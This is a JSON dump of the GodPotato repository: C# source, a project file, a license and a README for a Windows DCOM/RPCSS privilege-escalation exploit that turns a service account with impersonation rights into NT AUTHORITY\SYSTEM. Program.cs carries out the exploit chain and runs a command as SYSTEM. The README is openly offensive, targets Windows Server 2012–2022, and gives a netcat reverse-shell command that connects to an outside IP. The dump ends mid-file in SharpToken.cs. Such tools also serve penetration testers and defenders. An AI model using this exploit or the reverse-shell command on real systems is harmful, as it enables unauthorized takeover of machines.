{
  "metadata": {
    "timestamp": 1736710953221,
    "page": 611,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjYyMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "BeichenDream/GodPotato",
      "stars": 1856,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.048828125,
          "content": "/.vs/\n/bin/\n/obj/\nGodPotato.csproj.user\napp.config"
        },
        {
          "name": "ArgsParse.cs",
          "type": "blob",
          "size": 8.82421875,
          "content": "﻿using System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Reflection;\n\nnamespace GodPotato\n{\n    internal class ArgsParse\n    {\n        [System.AttributeUsage(AttributeTargets.Property, Inherited = false, AllowMultiple = true)]\n        public sealed class ArgsAttribute : Attribute\n        {\n            public string FieldName { get; set; }\n            public string DefaultValue { get; set; }\n            public bool Required { get; set; }\n            public string Description { get; set; }\n            public ArgsAttribute(string FieldName, string DefaultValue)\n            {\n                this.FieldName = FieldName;\n                this.DefaultValue = DefaultValue;\n            }\n        }\n\n        protected static void ParseArgsSetValue(object obj, PropertyInfo propertyInfo, string value)\n        {\n            Type propertyType = propertyInfo.PropertyType;\n            object valueObj = null;\n            if (propertyType.IsPrimitive)\n            {\n                MethodInfo methodInfo = propertyType.GetMethod(\"Parse\", new Type[] { typeof(string) });\n                methodInfo.Invoke(null, new object[] { valueObj });\n            }\n            else if (propertyType == typeof(string))\n            {\n                valueObj = value;\n            }\n            else if (propertyType == typeof(string[]))\n            {\n                string[] values = value.Split(',');\n                valueObj = values;\n            }\n            else if (propertyType == typeof(byte[]))\n            {\n                valueObj = Convert.FromBase64String(value);\n            }\n            else if (propertyType.IsArray && propertyType.GetElementType().IsPrimitive)\n            {\n                Type elementType = propertyType.GetElementType();\n                string[] strValues = value.Split(',');\n                List<object> values = new List<object>();\n                MethodInfo methodInfo = elementType.GetMethod(\"Parse\", new Type[] { typeof(string) });\n\n                foreach (var str in strValues)\n                {\n                    if (str.Contains(\"-\"))\n                    {\n                        string[] strRanges = str.Split('-');\n                        long startRange = long.Parse(strRanges[0]);\n                        long stopRange = long.Parse(strRanges[1]);\n                        for (long i = startRange; i <= stopRange; i++)\n                        {\n                            values.Add((methodInfo.Invoke(null, new object[] { i.ToString() })));\n                        }\n                    }\n                    else\n                    {\n                        values.Add(methodInfo.Invoke(null, new object[] { str }));\n                    }\n                }\n                Array array = Array.CreateInstance(elementType, values.Count);\n                for (int i = 0; i < values.Count; i++)\n                {\n                    array.SetValue(values[i], i);\n                }\n                valueObj = array;\n            }\n            else if (propertyType.IsEnum)\n            {\n                valueObj = Enum.Parse(propertyType, value);\n            }            \n\n            propertyInfo.SetValue(obj, valueObj, null);\n\n        }\n        public static T ParseArgs<T>(string[] args)\n        {\n            Type type = typeof(T);\n            Type argsAttributeType = typeof(ArgsAttribute);\n            object value = type.GetConstructor(new Type[0]).Invoke(new object[0]);\n            PropertyInfo[] propertyInfos = type.GetProperties();\n            Dictionary<string, PropertyInfo> propertyInfoDict = new Dictionary<string, PropertyInfo>();\n            List<string> requiredPropertyList = new List<string>();\n            foreach (PropertyInfo propertyInfo in propertyInfos)\n            {\n                ArgsAttribute argsAttribute = (ArgsAttribute)Attribute.GetCustomAttribute(propertyInfo, argsAttributeType);\n                if (argsAttribute != null)\n                {\n                    string attributeLower = argsAttribute.FieldName.ToLower();\n                    if (argsAttribute.Required)\n                    {\n                        requiredPropertyList.Add(attributeLower);\n                    }\n                    propertyInfoDict.Add(attributeLower, propertyInfo);\n                    ParseArgsSetValue(value, propertyInfo, argsAttribute.DefaultValue);\n                }\n            }\n\n            for (int i = 0; i < args.Length; i++)\n            {\n                string currentArg = args[i];\n                if (currentArg.StartsWith(\"-\"))\n                {\n                    string currentArgName = currentArg.Substring(1).ToLower();\n                    if ((i + 1 < args.Length))\n                    {\n                        i++;\n                        string currentArgValue = args[i];\n\n                        PropertyInfo propertyInfo;\n                        if (propertyInfoDict.TryGetValue(currentArgName, out propertyInfo))\n                        {\n                            ParseArgsSetValue(value, propertyInfo, currentArgValue);\n                            requiredPropertyList.Remove(currentArgName);\n                        }\n                    }\n                }\n            }\n\n            if (requiredPropertyList.Count > 0)\n            {\n                throw new Exception($\"Required Parameter {string.Join(\",\", requiredPropertyList.ToArray())}\");\n            }\n\n            return (T)value;\n        }\n        public static string PrintHelp(Type type,string head,string appName, string[] examples) {;\n            Type argsAttributeType = typeof(ArgsAttribute);\n            object value = type.GetConstructor(new Type[0]).Invoke(new object[0]);\n            PropertyInfo[] propertyInfos = type.GetProperties();\n            List<ArgsAttribute> propertyInfoList = new List<ArgsAttribute>();\n            List<ArgsAttribute> requiredPropertyList = new List<ArgsAttribute>();\n            foreach (PropertyInfo propertyInfo in propertyInfos)\n            {\n                ArgsAttribute argsAttribute = (ArgsAttribute)Attribute.GetCustomAttribute(propertyInfo, argsAttributeType);\n                if (argsAttribute != null)\n                {\n                    propertyInfoList.Add(argsAttribute);\n                    if (argsAttribute.Required)\n                    {\n                        requiredPropertyList.Add(argsAttribute);\n                    }\n                }\n            }\n\n            StringWriter stringBuilder = new StringWriter();\n            stringBuilder.WriteLine(head);\n            stringBuilder.WriteLine();\n            stringBuilder.WriteLine(\"Arguments:\");\n            stringBuilder.WriteLine();\n            foreach (var argsAttribute in propertyInfoList)\n            {\n                stringBuilder.WriteLine(\"\\t-{0} Required:{1} {2} (default {3})\", argsAttribute.FieldName, argsAttribute.Required, argsAttribute.Description, argsAttribute.DefaultValue); \n            }\n            stringBuilder.WriteLine();\n            stringBuilder.WriteLine(\"Example:\");\n            stringBuilder.WriteLine();\n            foreach (string example in examples)\n            {\n                stringBuilder.WriteLine(example);\n            }\n\n            \n\n            if (requiredPropertyList.Count > 0)\n            {\n                string requiredExample = \"\";\n                requiredExample = appName + \" \";\n                foreach (ArgsAttribute argsAttribute in requiredPropertyList)\n                {\n                    if (argsAttribute.DefaultValue.Contains(\" \") || argsAttribute.DefaultValue.Contains(\"\\t\") || argsAttribute.DefaultValue.Contains(\"\\r\"))\n                    {\n                        requiredExample += string.Format(\"-{0} \\\"{1}\\\" \", argsAttribute.FieldName, argsAttribute.DefaultValue);\n                    }\n                    else\n                    {\n                        requiredExample += string.Format(\"-{0} {1} \", argsAttribute.FieldName, argsAttribute.DefaultValue);\n                    }\n                }\n                stringBuilder.WriteLine(requiredExample); ;\n            }\n\n            if (propertyInfoList.Count > 0 && requiredPropertyList.Count != propertyInfoList.Count)\n            {\n                string allParameterExample = \"\";\n                allParameterExample = appName + \" \";\n                foreach (ArgsAttribute argsAttribute in propertyInfoList)\n                {\n                    if (argsAttribute.DefaultValue.Contains(\" \") || argsAttribute.DefaultValue.Contains(\"\\t\") || argsAttribute.DefaultValue.Contains(\"\\r\"))\n                    {\n                        allParameterExample += string.Format(\"-{0} \\\"{1}\\\" \", argsAttribute.FieldName, argsAttribute.DefaultValue);\n                    }\n                    else\n                    {\n                        allParameterExample += string.Format(\"-{0} {1} \", argsAttribute.FieldName, argsAttribute.DefaultValue);\n                    }\n                }\n                stringBuilder.WriteLine(allParameterExample); ;\n            }\n\n\n\n            return stringBuilder.ToString(); \n        }\n    }\n}\n"
        },
        {
          "name": "GodPotato.csproj",
          "type": "blob",
          "size": 2.4482421875,
          "content": "﻿<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Project ToolsVersion=\"15.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <Import Project=\"$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props\" Condition=\"Exists('$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props')\" />\n  <PropertyGroup>\n    <Configuration Condition=\" '$(Configuration)' == '' \">Debug</Configuration>\n    <Platform Condition=\" '$(Platform)' == '' \">AnyCPU</Platform>\n    <ProjectGuid>{2AE886C3-3272-40BE-8D3C-EBAEDE9E61E1}</ProjectGuid>\n    <OutputType>Library</OutputType>\n    <RootNamespace>GodPotato</RootNamespace>\n    <AssemblyName>GodPotato</AssemblyName>\n    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>\n    <FileAlignment>512</FileAlignment>\n    <Deterministic>true</Deterministic>\n    <TargetFrameworkProfile />\n  </PropertyGroup>\n  <PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' \">\n    <PlatformTarget>AnyCPU</PlatformTarget>\n    <DebugSymbols>true</DebugSymbols>\n    <DebugType>full</DebugType>\n    <Optimize>false</Optimize>\n    <OutputPath>bin\\Debug\\</OutputPath>\n    <DefineConstants>DEBUG;TRACE</DefineConstants>\n    <ErrorReport>prompt</ErrorReport>\n    <WarningLevel>4</WarningLevel>\n  </PropertyGroup>\n  <PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' \">\n    <PlatformTarget>AnyCPU</PlatformTarget>\n    <DebugType>none</DebugType>\n    <Optimize>true</Optimize>\n    <OutputPath>bin\\Release\\</OutputPath>\n    <DefineConstants>TRACE</DefineConstants>\n    <ErrorReport>prompt</ErrorReport>\n    <WarningLevel>4</WarningLevel>\n  </PropertyGroup>\n  <PropertyGroup>\n    <StartupObject />\n  </PropertyGroup>\n  <ItemGroup>\n    <Reference Include=\"System\" />\n    <Reference Include=\"System.Data\" />\n    <Reference Include=\"System.Xml\" />\n  </ItemGroup>\n  <ItemGroup>\n    <Compile Include=\"ArgsParse.cs\" />\n    <Compile Include=\"NativeAPI\\GodPotatoContext.cs\" />\n    <Compile Include=\"NativeAPI\\GodPotatoUnmarshalTrigger.cs\" />\n    <Compile Include=\"NativeAPI\\IStreamImpl.cs\" />\n    <Compile Include=\"NativeAPI\\NativeMethods.cs\" />\n    <Compile Include=\"NativeAPI\\ObjRef.cs\" />\n    <Compile Include=\"NativeAPI\\UnmarshalDCOM.cs\" />\n    <Compile Include=\"Program.cs\" />\n    <Compile Include=\"Properties\\AssemblyInfo.cs\" />\n    <Compile Include=\"SharpToken.cs\" />\n  </ItemGroup>\n  <ItemGroup>\n    <None Include=\"app.config\" />\n  </ItemGroup>\n  <Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />\n</Project>"
        },
        {
          "name": "GodPotato.csproj.user",
          "type": "blob",
          "size": 0.4306640625,
          "content": "﻿<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Project ToolsVersion=\"Current\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <PropertyGroup Condition=\"'$(Configuration)|$(Platform)' == 'Release|AnyCPU'\">\n    <StartArguments>-cmd whoami</StartArguments>\n  </PropertyGroup>\n  <PropertyGroup Condition=\"'$(Configuration)|$(Platform)' == 'Debug|AnyCPU'\">\n    <StartArguments>-cmd whoami</StartArguments>\n  </PropertyGroup>\n</Project>"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 11.08984375,
          "content": "                                 Apache License\n                           Version 2.0, January 2004\n                        http://www.apache.org/licenses/\n\n   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION\n\n   1. Definitions.\n\n      \"License\" shall mean the terms and conditions for use, reproduction,\n      and distribution as defined by Sections 1 through 9 of this document.\n\n      \"Licensor\" shall mean the copyright owner or entity authorized by\n      the copyright owner that is granting the License.\n\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n      outstanding shares, or (iii) beneficial ownership of such entity.\n\n      \"You\" (or \"Your\") shall mean an individual or Legal Entity\n      exercising permissions granted by this License.\n\n      \"Source\" form shall mean the preferred form for making modifications,\n      including but not limited to software source code, documentation\n      source, and configuration files.\n\n      \"Object\" form shall mean any form resulting from mechanical\n      transformation or translation of a Source form, including but\n      not limited to compiled object code, generated documentation,\n      and conversions to other media types.\n\n      \"Work\" shall mean the work of authorship, whether in Source or\n      Object form, made available under the License, as indicated by a\n      copyright notice that is included in or attached to the work\n      (an example is provided in the Appendix below).\n\n      \"Derivative Works\" shall mean any work, whether in Source or Object\n      form, that is based on (or derived from) the Work and for which the\n      editorial revisions, annotations, elaborations, or other modifications\n      represent, as a whole, an original work of authorship. For the purposes\n      of this License, Derivative Works shall not include works that remain\n      separable from, or merely link (or bind by name) to the interfaces of,\n      the Work and Derivative Works thereof.\n\n      \"Contribution\" shall mean any work of authorship, including\n      the original version of the Work and any modifications or additions\n      to that Work or Derivative Works thereof, that is intentionally\n      submitted to Licensor for inclusion in the Work by the copyright owner\n      or by an individual or Legal Entity authorized to submit on behalf of\n      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n      designated in writing by the copyright owner as \"Not a Contribution.\"\n\n      \"Contributor\" shall mean Licensor and any individual or Legal Entity\n      on behalf of whom a Contribution has been received by Licensor and\n      subsequently incorporated within the Work.\n\n   2. Grant of Copyright License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      copyright license to reproduce, prepare Derivative Works of,\n      publicly display, publicly perform, sublicense, and distribute the\n      Work and such Derivative Works in Source or Object form.\n\n   3. Grant of Patent License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      (except as stated in this section) patent license to make, have made,\n      use, offer to sell, sell, import, and otherwise transfer the Work,\n      where such license applies only to those patent claims licensable\n      by such Contributor that are necessarily infringed by their\n      Contribution(s) alone or by combination of their Contribution(s)\n      with the Work to which such Contribution(s) was submitted. If You\n      institute patent litigation against any entity (including a\n      cross-claim or counterclaim in a lawsuit) alleging that the Work\n      or a Contribution incorporated within the Work constitutes direct\n      or contributory patent infringement, then any patent licenses\n      granted to You under this License for that Work shall terminate\n      as of the date such litigation is filed.\n\n   4. Redistribution. You may reproduce and distribute copies of the\n      Work or Derivative Works thereof in any medium, with or without\n      modifications, and in Source or Object form, provided that You\n      meet the following conditions:\n\n      (a) You must give any other recipients of the Work or\n          Derivative Works a copy of this License; and\n\n      (b) You must cause any modified files to carry prominent notices\n          stating that You changed the files; and\n\n      (c) You must retain, in the Source form of any Derivative Works\n          that You distribute, all copyright, patent, trademark, and\n          attribution notices from the Source form of the Work,\n          excluding those notices that do not pertain to any part of\n          the Derivative Works; and\n\n      (d) If the Work includes a \"NOTICE\" text file as part of its\n          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n          within a display generated by the Derivative Works, if and\n          wherever such third-party notices normally appear. The contents\n          of the NOTICE file are for informational purposes only and\n          do not modify the License. You may add Your own attribution\n          notices within Derivative Works that You distribute, alongside\n          or as an addendum to the NOTICE text from the Work, provided\n          that such additional attribution notices cannot be construed\n          as modifying the License.\n\n      You may add Your own copyright statement to Your modifications and\n      may provide additional or different license terms and conditions\n      for use, reproduction, or distribution of Your modifications, or\n      for any such Derivative Works as a whole, provided Your use,\n      reproduction, and distribution of the Work otherwise complies with\n      the conditions stated in this License.\n\n   5. Submission of Contributions. Unless You explicitly state otherwise,\n      any Contribution intentionally submitted for inclusion in the Work\n      by You to the Licensor shall be under the terms and conditions of\n      this License, without any additional terms or conditions.\n      Notwithstanding the above, nothing herein shall supersede or modify\n      the terms of any separate license agreement you may have executed\n      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n   7. Disclaimer of Warranty. Unless required by applicable law or\n      agreed to in writing, Licensor provides the Work (and each\n      Contributor provides its Contributions) on an \"AS IS\" BASIS,\n      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n      implied, including, without limitation, any warranties or conditions\n      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A\n      PARTICULAR PURPOSE. You are solely responsible for determining the\n      appropriateness of using or redistributing the Work and assume any\n      risks associated with Your exercise of permissions under this License.\n\n   8. Limitation of Liability. In no event and under no legal theory,\n      whether in tort (including negligence), contract, or otherwise,\n      unless required by applicable law (such as deliberate and grossly\n      negligent acts) or agreed to in writing, shall any Contributor be\n      liable to You for damages, including any direct, indirect, special,\n      incidental, or consequential damages of any character arising as a\n      result of this License or out of the use or inability to use the\n      Work (including but not limited to damages for loss of goodwill,\n      work stoppage, computer failure or malfunction, or any and all\n      other commercial damages or losses), even if such Contributor\n      has been advised of the possibility of such damages.\n\n   9. Accepting Warranty or Additional Liability. While redistributing\n      the Work or Derivative Works thereof, You may choose to offer,\n      and charge a fee for, acceptance of support, warranty, indemnity,\n      or other liability obligations and/or rights consistent with this\n      License. However, in accepting such obligations, You may act only\n      on Your own behalf and on Your sole responsibility, not on behalf\n      of any other Contributor, and only if You agree to indemnify,\n      defend, and hold each Contributor harmless for any liability\n      incurred by, or claims asserted against, such Contributor by reason\n      of your accepting any such warranty or additional liability.\n\n   END OF TERMS AND CONDITIONS\n\n   APPENDIX: How to apply the Apache License to your work.\n\n      To apply the Apache License to your work, attach the following\n      boilerplate notice, with the fields enclosed by brackets \"[]\"\n      replaced with your own identifying information. (Don't include\n      the brackets!)  The text should be enclosed in the appropriate\n      comment syntax for the file format. We also recommend that a\n      file or class name and description of purpose be included on the\n      same \"printed page\" as the copyright notice for easier\n      identification within third-party archives.\n\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License."
        },
        {
          "name": "NativeAPI",
          "type": "tree",
          "content": null
        },
        {
          "name": "Program.cs",
          "type": "blob",
          "size": 4.7119140625,
          "content": "﻿using System;\nusing System.IO;\nusing GodPotato.NativeAPI;\nusing System.Security.Principal;\nusing SharpToken;\nusing static GodPotato.ArgsParse;\n\nnamespace GodPotato\n{\n    internal class Program\n    {\n\n\n        class GodPotatoArgs\n        {\n            [ArgsAttribute(\"cmd\",\"cmd /c whoami\",Description = \"CommandLine\",Required = true)]\n            public string cmd { get; set; }\n        }\n\n\n\n        static void Main(string[] args)\n        {\n            TextWriter ConsoleWriter = Console.Out;\n\n            GodPotatoArgs potatoArgs;\n\n            string helpMessage = PrintHelp(typeof(GodPotatoArgs), @\"                                                                                               \n    FFFFF                   FFF  FFFFFFF                                                       \n   FFFFFFF                  FFF  FFFFFFFF                                                      \n  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                \n  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                \n  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                \n FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   \n FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  \n FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  \n FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF \n FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF \n  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF \n  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  \n   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   \n    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    \n\"\n, \"GodPotato\", new string[0]);\n\n\n            if (args.Length == 0)\n            {\n                ConsoleWriter.WriteLine(helpMessage);\n                return;\n            }\n            else\n            {\n                try\n                {\n                    potatoArgs = ParseArgs<GodPotatoArgs>(args);\n                }\n                catch (Exception e)\n                {\n                    if (e.InnerException != null)\n                    {\n                        e = e.InnerException;\n                    }\n                    ConsoleWriter.WriteLine(\"Exception:\" + e.Message);\n                    ConsoleWriter.WriteLine(helpMessage);\n                    return;\n                }\n            }\n\n            try\n            {\n                GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());\n\n                ConsoleWriter.WriteLine(\"[*] CombaseModule: 0x{0:x}\", godPotatoContext.CombaseModule);\n                ConsoleWriter.WriteLine(\"[*] DispatchTable: 0x{0:x}\", godPotatoContext.DispatchTablePtr);\n                ConsoleWriter.WriteLine(\"[*] UseProtseqFunction: 0x{0:x}\", godPotatoContext.UseProtseqFunctionPtr);\n                ConsoleWriter.WriteLine(\"[*] UseProtseqFunctionParamCount: {0}\", godPotatoContext.UseProtseqFunctionParamCount);\n\n                ConsoleWriter.WriteLine(\"[*] HookRPC\");\n                godPotatoContext.HookRPC();\n                ConsoleWriter.WriteLine(\"[*] Start PipeServer\");\n                godPotatoContext.Start();\n\n                GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);\n                try\n                {\n                    ConsoleWriter.WriteLine(\"[*] Trigger RPCSS\");\n                    int hr = unmarshalTrigger.Trigger();\n                    ConsoleWriter.WriteLine(\"[*] UnmarshalObject: 0x{0:x}\", hr);\n                    \n                }\n                catch (Exception e)\n                {\n                    ConsoleWriter.WriteLine(e);\n                }\n\n\n                WindowsIdentity systemIdentity = godPotatoContext.GetToken();\n                if (systemIdentity != null)\n                {\n                    ConsoleWriter.WriteLine(\"[*] CurrentUser: \" + systemIdentity.Name);\n                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);\n\n                }\n                else\n                {\n                    ConsoleWriter.WriteLine(\"[!] Failed to impersonate security context token\");\n                }\n                godPotatoContext.Restore();\n                godPotatoContext.Stop();\n            }\n            catch (Exception e)\n            {\n                ConsoleWriter.WriteLine(\"[!] \" + e.Message);\n\n            }\n\n        }\n    }\n}\n"
        },
        {
          "name": "Properties",
          "type": "tree",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 2.7255859375,
          "content": "# GodPotato\n\n\nBased on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have \"ImpersonatePrivilege\" permission. Then you are \"NT AUTHORITY\\SYSTEM\", usually WEB services and database services have \"ImpersonatePrivilege\" permissions.\n\n\n\nPotato privilege escalation is usually used when we obtain WEB/database privileges. We can elevate a service user with low privileges to \"NT AUTHORITY\\SYSTEM\" privileges.\nHowever, the historical Potato has no way to run on the latest Windows system. When I was researching DCOM, I found a new method that can perform privilege escalation. There are some defects in rpcss when dealing with oxid, and rpcss is a service that must be opened by the system. , so it can run on almost any Windows OS, I named it GodPotato\n\n\n\n# Affected version\n\nWindows Server 2012 - Windows Server 2022 Windows8 - Windows 11\n\n\n# Example\n\n```\n\n    FFFFF                   FFF  FFFFFFF\n   FFFFFFF                  FFF  FFFFFFFF\n  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF\n  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF\n  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF\n FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF\n FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF\n FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF\n FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF\n FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF\n  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF\n  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF\n   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF\n    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF\n\n\nArguments:\n\n        -cmd Required:True CommandLine (default cmd /c whoami)\n\nExample:\n\nGodPotato -cmd \"cmd /c whoami\"\n\n\n```\n\n\nUse the program's built-in Clsid for privilege escalation and execute a simple command\n\n\n```\nGodPotato -cmd \"cmd /c whoami\"\n```\n\n![](images/1.png)\n\n\nCustomize Clsid and execute commands\n\n```\nGodPotato -cmd \"cmd /c whoami\"\n\n```\n\n\n![](images/2.png)\n\n\nExecute reverse shell commands\n\n```\nGodPotato -cmd \"nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012\"\n```\n# Thanks\n\nzcgonvh\n\n\nskay\n\n\n# License\n\n[Apache License 2.0](/LICENSE) \n"
        },
        {
          "name": "SharpToken.cs",
          "type": "blob",
          "size": 57.0380859375,
          "content": "﻿using System;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Runtime.ConstrainedExecution;\nusing System.Runtime.InteropServices;\nusing System.Security.Permissions;\nusing System.Security.Principal;\nusing System.Text;\n\nnamespace SharpToken\n{\n\n    public enum IntegrityLevel : uint\n    {\n        Untrusted,\n        LowIntegrity = 0x00001000,\n        MediumIntegrity = 0x00002000,\n        MediumHighIntegrity = 0x100 + MediumIntegrity,\n        HighIntegrity = 0X00003000,\n        SystemIntegrity = 0x00004000,\n        ProtectedProcess = 0x00005000\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct PROCESS_ACCESS_TOKEN\n    {\n        public IntPtr Token;\n        public IntPtr Thread;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct SECURITY_ATTRIBUTES\n    {\n        public int nLength;\n        public IntPtr pSecurityDescriptor;\n        public bool bInheritHandle;\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct TOKEN_MANDATORY_LABEL\n    {\n\n        public SID_AND_ATTRIBUTES Label;\n\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct TOKEN_GROUPS\n    {\n        public uint GroupCount;\n\n        public SID_AND_ATTRIBUTES Groups;\n    }\n\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct SID_AND_ATTRIBUTES\n    {\n        public IntPtr Sid;\n        public uint Attributes;\n    }\n\n\n    [Flags]\n    public enum ProcessCreateFlags : uint\n    {\n        DEBUG_PROCESS = 0x00000001,\n        DEBUG_ONLY_THIS_PROCESS = 0x00000002,\n        CREATE_SUSPENDED = 0x00000004,\n        DETACHED_PROCESS = 0x00000008,\n        CREATE_NEW_CONSOLE = 0x00000010,\n        NORMAL_PRIORITY_CLASS = 0x00000020,\n        IDLE_PRIORITY_CLASS = 0x00000040,\n        HIGH_PRIORITY_CLASS = 0x00000080,\n        REALTIME_PRIORITY_CLASS = 0x00000100,\n        CREATE_NEW_PROCESS_GROUP = 0x00000200,\n        CREATE_UNICODE_ENVIRONMENT = 0x00000400,\n        CREATE_SEPARATE_WOW_VDM = 0x00000800,\n        CREATE_SHARED_WOW_VDM = 0x00001000,\n        CREATE_FORCEDOS = 0x00002000,\n        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,\n        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,\n        INHERIT_PARENT_AFFINITY = 0x00010000,\n        INHERIT_CALLER_PRIORITY = 0x00020000,\n        CREATE_PROTECTED_PROCESS = 0x00040000,\n        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,\n        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,\n        PROCESS_MODE_BACKGROUND_END = 0x00200000,\n        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,\n        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,\n        CREATE_DEFAULT_ERROR_MODE = 0x04000000,\n        CREATE_NO_WINDOW = 0x08000000,\n        PROFILE_USER = 0x10000000,\n        PROFILE_KERNEL = 0x20000000,\n        PROFILE_SERVER = 0x40000000,\n        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,\n    }\n\n    public enum PROCESS_INFORMATION_CLASS\n    {\n        ProcessBasicInformation,\n        ProcessQuotaLimits,\n        ProcessIoCounters,\n        ProcessVmCounters,\n        ProcessTimes,\n        ProcessBasePriority,\n        ProcessRaisePriority,\n        ProcessDebugPort,\n        